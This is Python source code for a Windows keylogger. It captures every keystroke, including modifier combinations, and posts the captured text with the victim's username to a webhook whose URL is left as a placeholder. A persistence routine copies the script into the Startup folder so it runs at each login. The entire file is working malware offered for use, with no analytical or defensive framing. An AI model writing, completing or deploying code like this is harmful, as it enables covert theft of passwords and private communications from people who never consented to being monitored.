# Libraries
import time
import threading
import requests
import keyboard
import os
import sys
import shutil
import winshell

# Configuration parameters
webhook = 'put the webhook here'
debug = False

class PersistenceManager:

    def __init__(self, debug: bool = False):
        self.debug = debug

    def add_to_startup(self):
        if winshell is None:
            if self.debug:
                print("[DEBUG] winshell no disponible; no se puede añadir al inicio.")
            return False

        if getattr(sys, 'frozen', False):
            current_file = sys.executable
        else:
            current_file = os.path.abspath(__file__)

        try:
            startup_folder = winshell.startup()
            destination = os.path.join(startup_folder, os.path.basename(current_file))

            if os.path.exists(destination):
                if self.debug:
                    print(f"[DEBUG] Ya existe en Startup: {destination}")
                return True

            shutil.copy(current_file, destination)

            if self.debug:
                print(f"[DEBUG] Copiado a Startup: {destination}")
            return True
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error al copiar a Startup: {e}")
            return False

    def run(self):
        self.add_to_startup()

class KeyLogger:

    def __init__(self, debug: bool = False, webhook: str = ''):
        self.debug = debug
        self.webhook = webhook
        self.lock = threading.Lock()
        self.send_time = 30
        self.keys_chain = []
        self.username = os.getlogin()

    def listen_keys(self):
        if self.debug:
            print('\n[  LISTENING KEYS   ]\n')

        def on_press(event):
            key = event.name
            mods = []

            if keyboard.is_pressed('ctrl'):
                mods.append("Ctrl")

            if keyboard.is_pressed('alt'):
                mods.append("Alt")

            if keyboard.is_pressed('shift'):
                mods.append("Shift")

            if mods:
                combo = ' + '.join(f' {mod} ' for mod in mods) + f' + {key} '
                self.keys_chain.append(f' {combo} ')

            elif key in ['space', 'tab', 'enter', 'backspace', 'esc', 'caps lock', 'delete', 'insert', 'home', 'end', 'page up', 'page down']:
                special_keys = {
                    'space': ' ',
                    'tab': '[TAB]',
                    'enter': '[ENTER]',
                    'backspace': '[BKSP]',
                    'esc': '[ESC]',
                    'caps lock': '[CAPS]',
                    'delete': '[DEL]',
                    'insert': '[INS]',
                    'home': '[HOME]',
                    'end': '[END]',
                    'page up': '[PGUP]',
                    'page down': '[PGDN]'
                }

                self.keys_chain.append(special_keys.get(key, f'[{key.upper()}]'))

            elif key == 'space':
                self.keys_chain.append(' ')

            elif key == 'enter':
                self.send_data(self.keys_chain)
                self.keys_chain.clear()

            else:
                self.keys_chain.append(key)

        keyboard.on_press(on_press)

        try:
            while True:
                time.sleep(1)

        except Exception as e:
            if self.debug:
                print(f'[!] Error in listen_keys: {e} [!]')

    def send_data(self, keys_chain):
        if not keys_chain:
            return

        try:
            with self.lock:
                data = {'content': f"\n[+] {self.username} -> ".join(keys_chain)}
                response = requests.post(self.webhook, data=data, timeout=20)

            if self.debug:
                if response.status_code in (200, 201, 204):
                    print(f'[+] Data sent successfully. Status code {response.status_code} [+]')
                else:
                    print(f'[!] Failed to send data: {response.status_code} [!]')

        except requests.RequestException as response:
            if self.debug:
                print(f'[!] Network error while sending: {response} [!]')

        except Exception as error:
            if self.debug:
                print(f'[!] Error sending data: {error} [!]')

    def send_to_discord_loop(self, stop_event=None):

        if self.send_time <= 0:
            raise ValueError('[!] self.send_time must be > 0 [!]')

        if stop_event is None:
            stop_event = threading.Event()

        if self.debug:
            print(f'[+] Starting send loop every {self.send_time} seconds [+]')

        while not stop_event.is_set():
            stopped = stop_event.wait(timeout=self.send_time)
            if stopped:
                break

        if self.debug:
            print('[+] Send loop stopped [+]')

    def run(self):
        listen_keys_thread = threading.Thread(target=self.listen_keys)
        listen_keys_thread.daemon = True
        listen_keys_thread.start()
        stop_event = threading.Event()
        send_loop_thread = threading.Thread(target=self.send_to_discord_loop, args=(stop_event,))
        send_loop_thread.daemon = True
        send_loop_thread.start()

        try:
            while True:
                time.sleep(1)

        except KeyboardInterrupt:
            print("[+] Exiting gracefully [+]")
            stop_event.set()
            listen_keys_thread.join()
            send_loop_thread.join()

def main():
    while True:
        try:
            key_logger = KeyLogger(webhook=webhook, debug=debug).run()
            PersistenceManager(debug=debug).run()
        except Exception as e:
            if debug:
                print(f'[!] Error in main loop: {e} [!]')
            time.sleep(5)

main()